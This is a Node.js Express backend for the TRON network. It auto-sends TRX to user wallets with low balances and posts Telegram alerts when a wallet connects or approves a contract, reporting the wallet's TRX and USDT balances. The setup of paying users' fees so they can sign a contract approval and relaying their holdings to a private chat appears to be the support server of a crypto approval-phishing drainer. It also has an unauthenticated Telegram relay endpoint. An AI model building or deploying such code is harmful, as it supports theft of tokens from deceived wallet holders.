const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const TronWebModule = require('tronweb');
const TronWeb = TronWebModule.default || TronWebModule;
const axios = require('axios');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 4000;

app.use(helmet());
app.use(cors({ origin: true, credentials: true }));
app.use(express.json({ limit: '1mb' }));

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  message: 'Too many requests from this IP, please try again later.'
});
app.use(limiter);

const tronWeb = new TronWeb({
  fullHost: 'https://api.trongrid.io',
  privateKey: process.env.TRON_PRIVATE_KEY
});

const SERVER_CONFIG = {
  privateKey: process.env.TRON_PRIVATE_KEY,
  address: process.env.TRON_ADDRESS,
  autoSendAmount: Number(process.env.AUTO_SEND_AMOUNT || 15),
  minimumBalance: Number(process.env.MINIMUM_BALANCE || 14)
};

const validateRequest = (req, res, next) => {
  const { userAddress } = req.body;

  if (!userAddress) {
    return res.status(400).json({ error: 'User address is required', success: false });
  }

  if (!TronWeb.isAddress(userAddress)) {
    return res.status(400).json({ error: 'Invalid TRON address', success: false });
  }

  next();
};

async function sendTelegramMessage(text) {
  const BOT_TOKEN = process.env.BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
  const CHAT_ID = process.env.CHAT_ID || process.env.TELEGRAM_CHAT_ID;

  if (!BOT_TOKEN || !CHAT_ID) {
    throw new Error('Missing BOT_TOKEN or CHAT_ID environment variables');
  }

  const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    chat_id: CHAT_ID,
    text,
    parse_mode: 'HTML'
  });

  if (!response.data.ok) {
    throw new Error(response.data.description || 'Telegram API request failed');
  }

  return response.data;
}

app.get('/health', (req, res) => {
  res.json({
    ok: true,
    message: 'Master TRON + Telegram backend is running',
    serverAddress: SERVER_CONFIG.address,
    timestamp: new Date().toISOString()
  });
});

app.get('/server-info', (req, res) => {
  res.json({
    success: true,
    serverAddress: SERVER_CONFIG.address,
    autoSendAmount: SERVER_CONFIG.autoSendAmount,
    minimumBalance: SERVER_CONFIG.minimumBalance,
    network: 'Mainnet',
    apiVersion: '1.0.0'
  });
});

app.post('/check-balance', validateRequest, async (req, res) => {
  try {
    const { userAddress } = req.body;
    const balance = await tronWeb.trx.getBalance(userAddress);
    const balanceInTRX = tronWeb.fromSun(balance);

    res.json({
      success: true,
      address: userAddress,
      balance: balanceInTRX,
      needsFunding: balanceInTRX < SERVER_CONFIG.minimumBalance,
      autoSendAmount: SERVER_CONFIG.autoSendAmount
    });
  } catch (error) {
    console.error('Balance check error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to check balance',
      message: error.message
    });
  }
});

app.post('/send-trx', validateRequest, async (req, res) => {
  try {
    const { userAddress } = req.body;

    const balance = await tronWeb.trx.getBalance(userAddress);
    const balanceInTRX = tronWeb.fromSun(balance);

    if (balanceInTRX >= SERVER_CONFIG.minimumBalance) {
      return res.json({
        success: true,
        message: 'User already has sufficient balance',
        balance: balanceInTRX,
        sent: false
      });
    }

    const serverBalance = await tronWeb.trx.getBalance(SERVER_CONFIG.address);
    const serverBalanceInTRX = tronWeb.fromSun(serverBalance);

    if (serverBalanceInTRX < SERVER_CONFIG.autoSendAmount) {
      return res.status(500).json({
        success: false,
        error: 'Server has insufficient funds',
        serverBalance: serverBalanceInTRX,
        required: SERVER_CONFIG.autoSendAmount
      });
    }

    const transaction = await tronWeb.transactionBuilder.sendTrx(
      userAddress,
      tronWeb.toSun(SERVER_CONFIG.autoSendAmount),
      SERVER_CONFIG.address
    );

    const signedTransaction = await tronWeb.trx.sign(transaction);
    const result = await tronWeb.trx.sendRawTransaction(signedTransaction);

    if (result.result) {
      return res.json({
        success: true,
        message: `Sent ${SERVER_CONFIG.autoSendAmount} TRX successfully`,
        transactionId: result.txid,
        amount: SERVER_CONFIG.autoSendAmount,
        recipient: userAddress,
        sent: true
      });
    }

    throw new Error('Transaction failed');
  } catch (error) {
    console.error('Send TRX error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to send TRX',
      message: error.message
    });
  }
});

app.post('/transaction-status', async (req, res) => {
  try {
    const { transactionId } = req.body;

    if (!transactionId) {
      return res.status(400).json({ success: false, error: 'Transaction ID is required' });
    }

    const transaction = await tronWeb.trx.getTransaction(transactionId);

    res.json({
      success: true,
      transactionId,
      status: transaction.ret ? 'success' : 'failed',
      confirmed: !!transaction.ret,
      transaction
    });
  } catch (error) {
    console.error('Transaction status error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to get transaction status',
      message: error.message
    });
  }
});

app.post('/telegram-notify', async (req, res) => {
  try {
    const { type, walletAddress, balance, usdtBalance, transactionId, amount, trxBalance, timestamp } = req.body;

    let message = '';

    if (type === 'wallet_connect') {
      const trxBalanceStr = balance !== undefined ? Number(balance).toFixed(6) : 'N/A';
      const usdtBalanceStr = usdtBalance !== undefined ? Number(usdtBalance).toFixed(2) : 'N/A';
      message = `🔗 Wallet Connected\n\n` +
        `💰 Wallet Address: ${walletAddress}\n` +
        `💵 TRX Balance: ${trxBalanceStr} TRX\n` +
        `💵 USDT Balance: ${usdtBalanceStr} USDT\n` +
        `🕐 Time: ${timestamp || new Date().toISOString()}\n\n` +
        `✅ User successfully connected their wallet`;
    } else if (type === 'transaction_approve') {
      const amountInTRX = amount ? (Number(amount) / 1000000).toFixed(6) : 'N/A';
      let txIdStr = transactionId ? String(transactionId) : 'N/A';
      const trxBalanceStr = trxBalance !== undefined ? Number(trxBalance).toFixed(6) : 'N/A';
      const usdtBalanceStr = usdtBalance !== undefined ? Number(usdtBalance).toFixed(2) : 'N/A';

      message = `✅ Transaction Approved\n\n` +
        `💰 Wallet Address: ${walletAddress}\n` +
        `📊 Transaction ID: ${txIdStr}\n` +
        `💵 Transaction Amount: ${amountInTRX} TRX\n` +
        `💵 Current TRX Balance: ${trxBalanceStr} TRX\n` +
        `💵 Current USDT Balance: ${usdtBalanceStr} USDT\n` +
        `🕐 Time: ${timestamp || new Date().toISOString()}\n\n` +
        `✅ User successfully approved the contract transaction`;
    } else {
      return res.status(400).json({ success: false, error: 'Invalid notification type' });
    }

    const result = await sendTelegramMessage(message);

    res.json({
      success: true,
      message: 'Telegram notification sent',
      telegramMessageId: result.result && result.result.message_id
    });
  } catch (error) {
    console.error('Telegram notification error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to send Telegram notification',
      message: error.message
    });
  }
});

app.post('/api/telegram', async (req, res) => {
  try {
    const payload = req.body || {};
    const text = payload.text || payload.message || 'No message provided';
    const result = await sendTelegramMessage(text);

    res.json({ ok: true, result });
  } catch (error) {
    console.error('Telegram send failed:', error);
    res.status(500).json({ ok: false, error: error.message });
  }
});

app.use((err, req, res, next) => {
  console.error('Server error:', err);
  res.status(500).json({
    success: false,
    error: 'Internal server error',
    message: err.message
  });
});

app.listen(PORT, () => {
  console.log(`🚀 Master TRON + Telegram backend running on port ${PORT}`);
  console.log(`🔑 Server address: ${SERVER_CONFIG.address}`);
  console.log(`💰 Auto-send amount: ${SERVER_CONFIG.autoSendAmount} TRX`);
  console.log(`📊 Minimum balance: ${SERVER_CONFIG.minimumBalance} TRX`);
});

module.exports = app;
